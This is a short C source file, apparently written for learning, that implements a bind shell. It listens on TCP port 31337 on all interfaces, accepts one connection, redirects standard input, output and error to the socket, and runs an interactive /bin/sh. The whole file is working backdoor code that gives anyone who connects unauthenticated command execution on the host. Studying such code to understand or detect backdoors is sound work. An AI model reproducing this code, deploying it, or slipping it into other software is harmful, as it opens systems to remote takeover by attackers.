#include <stdio.h>
#include <string.h>

#include <unistd.h> // for close(), etc.
#include <netinet/in.h> // for struct sockaddr_in, etc.
#include <sys/socket.h> // for struct sockaddr, etc.
#include <arpa/inet.h> // for inet_addr(), etc.

int main(int ac, char **av)
{
	int rc;

	int fd = -1; // our socket file descriptor (server)
	int fd2 = -1; // new socket file descriptor for client connection

	struct sockaddr_in addr; // ours (server)
	struct sockaddr_in addr2; // theirs (client)

	int addr2_size;

	printf("Hello, world!\n");

	// CREATE SOCKET
	printf("socket()\n");
	fd = socket(PF_INET, SOCK_STREAM, 0);

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(31337);
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	//addr.sin_addr.s_addr = 0x80000001;
	//*(uint32_t *)&(addr.sin_addr) = 0x01000080; // 127.0.0.1
	//addr.sin_addr = 0x01000080; // 127.0.0.1

	if (fd == -1)
		{ perror("socket()"); goto cleanup; }

	// BIND
	printf("bind()\n");
	rc = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
	if (rc != 0)
		{ perror("bind()"); goto cleanup; }

	// LISTEN
	printf("listen()\n");
	rc = listen(fd, 1);
	if (rc != 0)
		{ perror("listen()"); goto cleanup; }
	
	// ACCEPT
	printf("accept()\n");
	addr2_size = sizeof(addr2);
	fd2 = accept(fd, 0, 0);
	if (fd2 == -1)
		{ perror("accept()"); goto cleanup; }

	// these close the descriptor, not the descriptee
	// in other words, the pseudo terminal remains open
	dup2(fd2, STDIN_FILENO); // close 0, make 0 describe socket
	dup2(fd2, STDOUT_FILENO); // close 1, make 1 describe socket
	dup2(fd2, STDERR_FILENO); // close 2, make 2 describe socket
	close(fd2); // socket not closed since still referenced by 0,1,2

	// EXECVE
	char *const child_argv[3] = {"/bin/sh", "-i", NULL};
	execve(child_argv[0], child_argv, NULL);

	cleanup:
		if (fd != -1)
			close(fd);

	return 0;
}
